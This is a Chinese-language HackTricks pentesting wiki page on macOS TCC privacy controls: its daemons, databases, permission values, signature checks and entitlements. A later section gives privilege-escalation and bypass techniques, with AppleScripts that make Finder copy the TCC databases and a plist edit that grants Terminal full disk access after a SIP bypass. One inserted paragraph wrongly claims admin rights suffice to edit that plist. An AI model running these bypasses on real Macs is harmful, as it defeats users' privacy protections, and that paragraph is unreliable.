# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **基本信息**

**TCC (Transparency, Consent, and Control)** 是 macOS 中的一种机制，用于从隐私角度**限制和控制应用程序对某些功能的访问**。这些功能可以包括位置服务、联系人、照片、麦克风、摄像头、辅助功能、完全磁盘访问等等。

从用户的角度来看，当应用程序要访问受 TCC 保护的功能时，他们会看到 TCC 的作用。这时，用户会收到一个对话框，询问他们是否允许访问。

用户也可以通过**显式意图**向应用程序授予对文件的访问权限，例如当用户将文件**拖放到程序中**时（显然程序应该具有对文件的访问权限）。

![TCC提示的示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** 由位于 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` 的**守护进程**处理，并在 `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` 中进行配置（注册 mach 服务 `com.apple.tccd.system`）。

每个已登录用户定义了一个在用户模式下运行的 tccd，其位置在 `/System/Library/LaunchAgents/com.apple.tccd.plist`，注册了 mach 服务 `com.apple.tccd` 和 `com.apple.usernotifications.delegate.com.apple.tccd`。

在这里，你可以看到作为系统和用户运行的 tccd：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
权限是从父应用程序继承的，并且权限是基于Bundle ID和Developer ID进行跟踪。

### TCC数据库

然后，选择将存储在TCC系统范围的数据库中，路径为`/Library/Application Support/com.apple.TCC/TCC.db`，或者对于每个用户的偏好设置，路径为`$HOME/Library/Application Support/com.apple.TCC/TCC.db`。这些数据库受到SIP（系统完整性保护）的保护，但您可以读取它们。

{% hint style="danger" %}
在iOS中，TCC数据库位于`/private/var/mobile/Library/TCC/TCC.db`
{% endhint %}

还有一个第三个TCC数据库位于`/var/db/locationd/clients.plist`，用于指示允许访问位置服务的客户端。

此外，具有完全磁盘访问权限的进程可以编辑用户模式数据库。现在，应用程序还需要FDA或`kTCCServiceEndpointSecurityClient`来读取数据库（以及修改用户数据库）。

{% hint style="info" %}
通知中心UI可以对系统TCC数据库进行更改：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

然而，用户可以使用**`tccutil`**命令行实用程序**删除或查询规则**。
{% endhint %}

{% tabs %}
{% tab title="用户数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="系统数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
检查这两个数据库，您可以查看应用程序允许、禁止或未拥有的权限（它会要求权限）。
{% endhint %}

* **`auth_value`** 可以有不同的值：denied(0)、unknown(1)、allowed(2)或limited(3)。
* **`auth_reason`** 可以有以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)。
* 有关表格的**其他字段**的更多信息，请参阅[**此博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。

{% hint style="info" %}
一些 TCC 权限包括：kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos... 没有公共列表定义了所有这些权限，但您可以查看这个[**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。

**完全磁盘访问**的名称是**`kTCCServiceSystemPolicyAllFiles`**，**`kTCCServiceAppleEvents`** 允许应用程序向其他常用于**自动化任务**的应用程序发送事件。

**kTCCServiceEndpointSecurityClient** 是一个 TCC 权限，也授予了高权限，其中包括写入用户数据库的选项。

此外，**`kTCCServiceSystemPolicySysAdminFiles`** 允许**更改**用户的 **`NFSHomeDirectory`** 属性，从而更改其主文件夹，因此可以**绕过 TCC**。
{% endhint %}

您还可以在`系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件和文件夹`中检查已授予应用程序的权限。

{% hint style="success" %}
请注意，即使其中一个数据库位于用户的主目录中，**由于 SIP 的限制，用户无法直接修改这些数据库**（即使您是 root）。配置或修改新规则的唯一方法是通过系统偏好设置窗格或应用程序询问用户的提示。

但是，请记住，用户可以使用**`tccutil`** **删除或查询规则**。&#x20;
{% endhint %}

#### 重置
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 签名检查

TCC **数据库**存储了应用程序的**Bundle ID**，但它还会**存储**关于**签名**的**信息**，以确保请求使用权限的应用程序是正确的。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
因此，使用相同名称和捆绑标识的其他应用程序将无法访问授予其他应用程序的权限。
{% endhint %}

### 权限

应用程序不仅需要请求和获得对某些资源的访问权限，还需要具备相关的权限。\
例如，Telegram具有`com.apple.security.device.camera`权限来请求访问相机。没有此权限的应用程序将无法访问相机（甚至不会要求用户授权）。

然而，对于访问某些用户文件夹（如`~/Desktop`、`~/Downloads`和`~/Documents`）的应用程序，它们不需要具备任何特定的权限。系统会透明地处理访问并根据需要提示用户。

苹果的应用程序不会生成提示。它们在其权限列表中包含预授予的权限，这意味着它们永远不会生成弹出窗口，也不会出现在任何TCC数据库中。例如：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
这将避免日历要求用户访问提醒事项、日历和通讯录。

{% hint style="success" %}
除了一些关于权限的官方文档外，还可以在[https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)找到一些非官方的**关于权限的有趣信息**。
{% endhint %}

### 敏感的未受保护的位置

* $HOME（本身）
* $HOME/.ssh，$HOME/.aws等
* /tmp

### 用户意图 / com.apple.macl

如前所述，可以通过将文件拖放到应用程序中来**授予应用程序对文件的访问权限**。这个访问权限不会在任何TCC数据库中指定，而是作为文件的**扩展属性**存储。该属性将**存储允许的应用程序的UUID**。
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
有趣的是，**`com.apple.macl`** 属性由 **Sandbox** 管理，而不是 tccd。

还要注意，如果将允许计算机上某个应用程序的 UUID 的文件移动到另一台计算机上，因为相同的应用程序将具有不同的 UID，它不会授予该应用程序访问权限。
{% endhint %}

扩展属性 `com.apple.macl` 无法像其他扩展属性一样被清除，因为它受到 SIP 的保护。然而，正如[**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过将文件进行压缩、删除和解压缩的方式来禁用它。

## TCC 权限提升和绕过

### 从 Automation 到 FDA 的权限提升

**Finder** 是一个始终具有 FDA 权限的应用程序（即使在用户界面中看不到），因此如果您对其具有 **Automation** 权限，可以滥用其权限来执行一些操作。

{% tabs %}
{% tab title="窃取用户的 TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="窃取系统的TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

您可以滥用此功能来**编写自己的用户TCC数据库**。

这是获取对Finder的**自动化权限**的TCC提示：

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

### 从用户TCC数据库到FDA的权限提升

获取对**用户TCC数据库的写入权限**后，您无法授予自己**`FDA`**权限，只有位于系统数据库中的权限可以授予。

但是您可以给自己**`对Finder的自动化权限`**，并滥用之前的技术来升级到FDA。

### 从FDA到TCC权限的权限提升

我不认为这是真正的权限提升，但以防万一您发现它有用：如果您控制具有FDA的程序，您可以**修改用户TCC数据库并赋予自己任何访问权限**。这可以作为一种持久性技术，在您可能失去FDA权限的情况下非常有用。

### 从SIP绕过到TCC绕过

系统的**TCC数据库**受到**SIP**的保护，因此只有具有**指定权限的进程才能修改**它。因此，如果攻击者找到了一个**绕过SIP的方法**（能够修改受SIP限制的文件），他将能够**移除**TCC数据库的保护，并赋予自己所有TCC权限。

但是，还有另一种滥用**SIP绕过来绕过TCC**的选项，文件`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`是一个需要TCC异常的应用程序的允许列表。因此，如果攻击者可以**移除此文件的SIP保护**并添加自己的**应用程序**，该应用程序将能够绕过TCC。\
例如，要添加终端：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

AllowApplicationsList.plist是一个macOS访问控制列表（ACL）文件，用于管理TCC（Transparency Consent and Control）框架中的应用程序访问权限。TCC是macOS的一种安全保护机制，用于保护用户的隐私和数据安全。

在AllowApplicationsList.plist中，您可以指定哪些应用程序可以访问敏感数据和功能，以及哪些应用程序被禁止访问。该文件列出了应用程序的Bundle Identifier（捆绑标识符），这是应用程序在macOS中的唯一标识符。

要修改AllowApplicationsList.plist文件，您需要具有管理员权限。您可以使用文本编辑器或终端命令来编辑该文件。确保在编辑之前备份文件，以防止意外的更改。

在编辑AllowApplicationsList.plist时，请确保遵循正确的语法和格式。每个应用程序的Bundle Identifier应该在<array>标签内的<dict>标签中列出。您可以添加或删除应用程序的Bundle Identifier来控制其访问权限。

编辑完成后，保存并退出文件。然后，您需要重新启动TCC服务，以使更改生效。您可以在终端中运行以下命令来重新启动TCC服务：

```
sudo killall -9 tccd
```

重新启动后，更改的应用程序访问权限将生效。

请注意，修改AllowApplicationsList.plist可能会对系统的安全性产生影响。确保只允许可信任的应用程序访问敏感数据和功能，并定期审查和更新访问控制列表，以保持系统的安全性。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC绕过

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考资料

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
